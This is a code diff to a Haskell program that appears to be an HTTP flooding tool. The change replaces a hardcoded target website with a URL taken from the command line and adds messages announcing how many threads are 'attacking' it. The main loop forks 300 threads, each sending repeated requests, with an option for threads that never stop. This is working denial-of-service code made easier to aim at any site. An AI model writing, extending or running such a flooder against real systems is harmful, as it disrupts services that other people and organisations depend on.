@@ -5,6 +5,7 @@ import Control.Monad (replicateM)
 import Network.HTTP
 import Network.HTTP.Base
 import Network.HTTP.Headers
+import System.Environment
 import System.IO.Error (IOError)
 import System.Random
 
@@ -58,7 +59,14 @@ main = do
   let nThreads = 300
       nAttacks = 100
   done <- newEmptyMVar
+  url:_ <- getArgs
+  putStrLn $ ("Attacking =" ++ url ++ " with "
+              ++ (show nThreads) ++ " forkIO threads.")
+  putStrLn $ (if nAttacks == -1
+              then "Each thread will not stop!"
+              else ("Each thread will perform " ++ (show nAttacks)
+                    ++ " attacks."))
   threadIds <- replicateM nThreads $ do
-    forkIO (attack done nAttacks "http://waynedev.me/")
+    forkIO (attack done nAttacks url)
   replicateM nThreads $ takeMVar done
   return ()
